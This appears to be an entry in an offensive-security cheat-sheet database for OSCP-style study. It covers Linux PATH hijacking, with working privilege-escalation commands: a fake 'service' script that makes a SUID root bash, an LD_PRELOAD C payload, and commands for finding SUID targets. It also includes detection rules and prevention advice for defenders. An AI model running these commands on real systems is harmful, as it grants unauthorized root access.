@@ -1,0 +1,85 @@
+{
+  "id": "linux-path-hijack",
+  "name": "PATH Hijacking - Exploit Relative Paths in SUID/Cron Scripts",
+  "command": "echo '/bin/bash' > /tmp/service && chmod +x /tmp/service && export PATH=/tmp:$PATH",
+  "description": "PATH hijacking exploits scripts or SUID binaries that call system commands without full paths. If the script runs 'service apache restart' instead of '/usr/sbin/service apache restart', you can create a malicious 'service' binary in a directory earlier in PATH and it runs with the script's privileges.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "silent",
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Path & Wildcard Abuse",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "Linux privilege escalation methodology",
+  "tags": [
+    "path-hijacking",
+    "privesc",
+    "linux",
+    "suid",
+    "relative-path",
+    "environment-variable"
+  ],
+  "mitre": [
+    "T1574.007"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== FIND TARGETS ===\n  # SUID binaries using relative paths\n  find / -perm -4000 -type f 2>/dev/null\n  # For each SUID binary, check what commands it calls:\n  strings /usr/local/bin/suid-binary | grep -E '^[a-z]'\n  ltrace /usr/local/bin/suid-binary 2>&1 | grep system\n  strace /usr/local/bin/suid-binary 2>&1 | grep exec\n\n  # Cron scripts using relative paths\n  cat /etc/crontab\n  ls /etc/cron.d/\n  # Look for scripts calling commands without full path\n\n=== EXPLOIT ===\n  # If SUID binary calls 'service' without full path:\n  echo '#!/bin/bash' > /tmp/service\n  echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/service\n  chmod +x /tmp/service\n  export PATH=/tmp:$PATH\n  /usr/local/bin/suid-binary\n  /tmp/rootbash -p  # root shell\n\n=== COMMON RELATIVE COMMANDS ===\n  service, curl, wget, python, php, cat, id, whoami, ifconfig, ip\n  # Any of these without a / prefix are exploitable\n\n=== ALSO CHECK ===\n  # Shared libraries (LD_PRELOAD/LD_LIBRARY_PATH)\n  # If SUID binary has env_keep for LD_PRELOAD:\n  echo '#include <stdio.h>\\nvoid _init() { setuid(0); system(\"/bin/bash -p\"); }' > /tmp/pe.c\n  gcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c\n  sudo LD_PRELOAD=/tmp/pe.so /usr/local/bin/suid-binary",
+  "examples": [
+    {
+      "label": "Create malicious binary and hijack PATH",
+      "command": "echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/service && chmod +x /tmp/service && export PATH=/tmp:$PATH"
+    },
+    {
+      "label": "Find SUID binaries with relative paths",
+      "command": "find / -perm -4000 -type f 2>/dev/null -exec strings {} \\; | grep -vE '^/' | sort -u"
+    },
+    {
+      "label": "Check what commands a SUID binary calls",
+      "command": "ltrace /usr/local/bin/suid-binary 2>&1 | grep -E '(system|exec|popen)'"
+    }
+  ],
+  "references": [
+    {
+      "title": "MITRE T1574.007 - Path Interception",
+      "url": "https://attack.mitre.org/techniques/T1574/007/"
+    },
+    {
+      "title": "HackTricks - PATH Hijacking",
+      "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
+    }
+  ],
+  "defense": {
+    "why_it_works": "When a binary calls system('service restart') without a full path, the OS searches $PATH directories in order. Prepending a writable directory with a malicious 'service' makes it execute first.",
+    "prerequisites": "SUID binary or privileged cron script using relative command paths; writable directory.",
+    "impact": "Privilege escalation to the owner of the SUID binary or cron job (often root).",
+    "detection": "[MITRE T1574.007] SUID binary executing unexpected child processes; PATH modifications in audit logs.",
+    "artifacts": "Process creation from SUID binary with unexpected child; modified PATH in environment.",
+    "splunk_spl": "index=linux sourcetype=linux:audit type=EXECVE\n| where match(a0, \"/tmp/|/dev/shm/|/var/tmp/\")\n| table _time, uid, euid, exe, a0, a1",
+    "elastic_kql": "process.executable:(/tmp/* OR /dev/shm/* OR /var/tmp/*) AND process.parent.executable:*suid*",
+    "sentinel_kql": "Syslog\n| where SyslogMessage contains \"EXECVE\" and (SyslogMessage contains \"/tmp/\" or SyslogMessage contains \"/dev/shm/\")\n| project TimeGenerated, Computer, SyslogMessage",
+    "sigma_rules": "lnx_path_hijacking_suid",
+    "prevention": "Always use full paths in scripts; remove unnecessary SUID bits; use secure_path in sudoers; mount /tmp with noexec.",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1574/007/",
+      "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
+    ],
+    "detections": [
+      {
+        "platform": "sigma",
+        "name": "SUID binary executing from writable directory",
+        "logic": "title: SUID Binary Child Process from Writable Directory\nstatus: experimental\nlogsource:\n  product: linux\n  service: auditd\ndetection:\n  selection:\n    type: EXECVE\n    a0|startswith:\n      - '/tmp/'\n      - '/dev/shm/'\n      - '/var/tmp/'\n  condition: selection\nlevel: high",
+        "data_source": "linux-audit",
+        "attack": [
+          "T1574.007"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate scripts temporarily placed in /tmp",
+        "tuning": "Correlate with parent process being SUID; filter known good processes"
+      }
+    ]
+  }
+}
